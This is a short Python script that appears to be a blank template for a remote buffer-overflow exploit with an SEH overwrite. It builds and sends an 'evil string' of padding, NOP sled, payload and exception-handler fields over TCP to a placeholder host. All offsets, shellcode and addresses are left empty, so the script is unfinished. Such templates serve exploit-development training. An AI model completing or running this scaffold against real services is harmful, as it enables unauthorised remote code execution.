import socket

# host IP/port number
rhost = '10.0.0.1'
rport = 9999

# exploit values
total    = 0
prefix   = ''
postfix  = '\n'
offset   = 0
nopsled  = '\x90' * 0
payload  = ''
overflow = 'A' * (offset - len(nopsled) - len(payload))
nseh     = ''
seh      = '' # ROP gadget address
padding  = 'A' * (total - len(prefix) - offset - len(nseh) - len(seh) - len(postfix))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # set timeout, connect to target, recv banner
        s.settimeout(5)
        s.connect((rhost, rport))
        s.recv(1024)

        # create and send exploit string
        exploit = prefix + overflow + nopsled + payload + nseh + seh + padding + postfix
        print('sending evil string (%s bytes)' %(len(exploit)))
        s.send(bytes(exploit, 'latin-1'))
